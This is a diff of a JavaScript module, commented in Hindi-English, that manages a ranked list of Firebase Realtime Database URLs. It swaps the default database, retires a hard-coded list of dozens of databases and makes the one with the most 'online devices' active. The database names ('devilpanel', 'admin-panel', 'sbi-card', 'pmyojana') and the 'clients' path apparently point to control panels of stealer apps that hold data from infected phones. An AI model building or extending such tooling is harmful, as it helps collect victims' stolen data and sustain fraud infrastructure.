@@ -14,7 +14,7 @@
 // sources inactive hain; listRunSources() har saved source ko batch ke
 // ACTIVE pool me rakhta hai.
 //
-// Default: agar list khali hai to env FIREBASE_DB_URL (ya vuvhbjbi default)
+// Default: agar list khali hai to env FIREBASE_DB_URL (ya ranked #1 default)
 // se ek "Default" source seed hota hai — pehla run bina setup ke chalta hai.
 //
 // PERMANENT (2026-11-07): owner ki poori ROLEX VIP list ab code me hai
@@ -39,7 +39,8 @@ import {
 } from './firebase-numbers.js';
 import { OWNER_FIREBASE_URLS } from './firebase-seed-urls.js';
 
-const DEFAULT_URL = 'https://vuvhbjbi-default-rtdb.firebaseio.com/';
+// v4: ranked list ka #1 DB (owner ke live report me sabse zyada online devices).
+const DEFAULT_URL = 'https://tata-1d605-default-rtdb.firebaseio.com/';
 // Ek message me itni URLs add ho sakti hain. Pehle 200 thi — owner ki list
 // 400+ ki hai, isliye 1000. Dedupe phir bhi hota hai.
 export const MAX_BULK_FIREBASE_SOURCES = 1000;
@@ -49,66 +50,13 @@ export const MAX_BULK_FIREBASE_SOURCES = 1000;
 // seedVersion save rehta hai, isliye baad me koi source delete karne par
 // woh restart par zabardasti wapas nahi aata.
 // v3 (2026-11-07): ROLEX VIP list add — purane installs par bhi ek baar seed.
-const BUILTIN_SEED_VERSION = 3;
-const LEGACY_BUILTIN_FIREBASE_URLS = [
-  'https://admin143-dab82-default-rtdb.firebaseio.com',
-  'https://albart-new-feed-default-rtdb.firebaseio.com',
-  'https://allahmohammad-5f389-default-rtdb.firebaseio.com',
-  'https://amar-47591-default-rtdb.firebaseio.com',
-  'https://asry-84be8-default-rtdb.firebaseio.com',
-  'https://bewafa-f42d3-default-rtdb.firebaseio.com',
-  'https://bhoto-f503f-default-rtdb.firebaseio.com',
-  'https://boka-d0c13-default-rtdb.firebaseio.com',
-  'https://chod-patti-default-rtdb.firebaseio.com',
-  'https://choduu00111-default-rtdb.firebaseio.com',
-  'https://cufutfutg-default-rtdb.firebaseio.com',
-  'https://devilpanel-c8e3e-default-rtdb.firebaseio.com',
-  'https://faizybro-default-rtdb.firebaseio.com',
-  'https://fdfmnb-91c13-default-rtdb.firebaseio.com',
-  'https://master80221-753fb-default-rtdb.firebaseio.com',
-  'https://mr-ansari-f8e1e-default-rtdb.asia-southeast1.firebasedatabase.app',
-  'https://myypppp-default-rtdb.asia-southeast1.firebasedatabase.app',
-  'https://noidaa-dda60-default-rtdb.firebaseio.com',
-  'https://odabu-91972-default-rtdb.firebaseio.com',
-  'https://pablo-57b21-default-rtdb.firebaseio.com',
-  'https://panel-4aa3d-default-rtdb.firebaseio.com',
-  'https://penal-a93a8-default-rtdb.firebaseio.com',
-  'https://pmyojana-7621e-default-rtdb.firebaseio.com',
-  'https://robin-60398-default-rtdb.firebaseio.com',
-  'https://rohitxpro-767b2-default-rtdb.firebaseio.com',
-  'https://romdas-903d3-default-rtdb.firebaseio.com',
-  'https://ronaak-admin-panel-default-rtdb.firebaseio.com',
-  'https://roy11-3bc9e-default-rtdb.firebaseio.com',
-  'https://roya-admin-default-rtdb.firebaseio.com',
-  'https://rupesh-6c5e5-default-rtdb.firebaseio.com',
-  'https://sale5-e588d-default-rtdb.firebaseio.com',
-  'https://sallu-9934f-default-rtdb.firebaseio.com',
-  'https://saluu-dcb00-default-rtdb.firebaseio.com',
-  'https://samsan-d4bda-default-rtdb.firebaseio.com',
-  'https://sanj-683c4-default-rtdb.firebaseio.com',
-  'https://sbi-card-c24ef-default-rtdb.firebaseio.com',
-  'https://taaaar-f97b6-default-rtdb.firebaseio.com',
-  'https://tabuna-4e962-default-rtdb.firebaseio.com',
-  'https://taniya-setup-panel-default-rtdb.firebaseio.com',
-  'https://terimaakichut-ce92d-default-rtdb.firebaseio.com',
-  'https://tinku-152d3-default-rtdb.firebaseio.com',
-  'https://unknown-5b51e-default-rtdb.firebaseio.com',
-  'https://ttitj-fe9b5-default-rtdb.firebaseio.com',
-  'https://vfxhj-9accf-default-rtdb.firebaseio.com',
-  'https://vault-29e76-default-rtdb.firebaseio.com',
-  'https://vhjhfhjgjy-default-rtdb.firebaseio.com',
-  'https://vikashhhh-default-rtdb.firebaseio.com',
-  'https://vivov-df9bb-default-rtdb.firebaseio.com',
-  'https://vishnu-cha-1-default-rtdb.firebaseio.com',
-  'https://westsidestory-1334f-default-rtdb.firebaseio.com',
-  'https://webfund3-default-rtdb.firebaseio.com',
-  'https://dhoni-ji-default-rtdb.firebaseio.com',
-  'https://dk-panel-default-rtdb.firebaseio.com',
-  'https://do-admin-v13-default-rtdb.firebaseio.com',
-  'https://do-admin-v21-default-rtdb.firebaseio.com',
-];
+// v4 (2026-11-28): owner ne naya live-checked Firebase batch diya — purani
+// 440-URL list poori tarah retire (delete + nayi ranked list seed).
+const BUILTIN_SEED_VERSION = 4;
+// Legacy export compatibility ke liye khaali.
+const LEGACY_BUILTIN_FIREBASE_URLS = [];
 
-// Purani 55 owner URLs + nayi ROLEX VIP list — duplicate hata kar, order
+// Owner ki nayi ranked list (online devices desc) — duplicate hata kar, order
 // preserve karke. Isi list se `ensureSeeded()` boot par sources banata hai.
 export const BUILTIN_FIREBASE_SOURCE_URLS = (() => {
   const out = [];
@@ -336,7 +284,7 @@ export function ensureSeeded() {
     const url = String(process.env.FIREBASE_DB_URL || DEFAULT_URL).trim();
     const src = {
       id: newSourceId(state),
-      name: 'Default (vuvhbjbi)',
+      name: 'Default (ranked #1)',
       url: url.replace(/\/+$/, ''),
       auth: String(process.env.FIREBASE_DB_AUTH || '').trim(),
       clientsPath: String(process.env.FIREBASE_CLIENTS_PATH || 'clients').trim(),
@@ -363,6 +311,32 @@ export function ensureSeeded() {
   const knownUrls = new Set(state.list.map((s) => normalizeSourceUrl(s.url)));
   const seedOnce = (Number(state.seedVersion) || 0) < BUILTIN_SEED_VERSION;
   const envUrls = envSeedUrls();
+
+  // Naya seed version = owner ki purani built-in list replace karo. Sirf woh
+  // rows hatti hain jo builtin hain (code se aayi thi) aur nayi list me nahi
+  // hain; manually add kiye gaye custom sources chhue nahi jaate.
+  if (seedOnce) {
+    const seedKeys = new Set(BUILTIN_FIREBASE_SOURCE_URLS.map(normalizeSourceUrl));
+    const stale = new Set(
+      state.list
+        .filter((s) => s.builtin === true && !seedKeys.has(normalizeSourceUrl(s.url)))
+        .map((s) => normalizeSourceUrl(s.url))
+    );
+    if (stale.size) {
+      const staleIds = new Set(state.list.filter((s) => stale.has(normalizeSourceUrl(s.url)) && s.builtin === true).map((s) => s.id));
+      state.list = state.list.filter((s) => !staleIds.has(s.id));
+      if (state.health && typeof state.health === 'object') {
+        for (const id of staleIds) delete state.health[id];
+      }
+      if (staleIds.has(state.activeId)) state.activeId = '';
+      for (const key of stale) {
+        knownUrls.delete(key);
+        deletedUrls.delete(key);
+      }
+      changed = true;
+    }
+  }
+
   const pendingSeed = [
     ...(seedOnce ? BUILTIN_FIREBASE_SOURCE_URLS : []),
     ...envUrls,
@@ -391,6 +365,11 @@ export function ensureSeeded() {
     }
   }
   if (seedOnce) {
+    // Nayi ranked list aayi to first-try source bhi wahi hona chahiye —
+    // yaani sabse zyada online devices wala DB.
+    const topUrl = normalizeSourceUrl(BUILTIN_FIREBASE_SOURCE_URLS[0] || '');
+    const top = topUrl ? state.list.find((s) => normalizeSourceUrl(s.url) === topUrl) : null;
+    if (top) state.activeId = top.id;
     state.seedVersion = BUILTIN_SEED_VERSION;
     changed = true;
   }
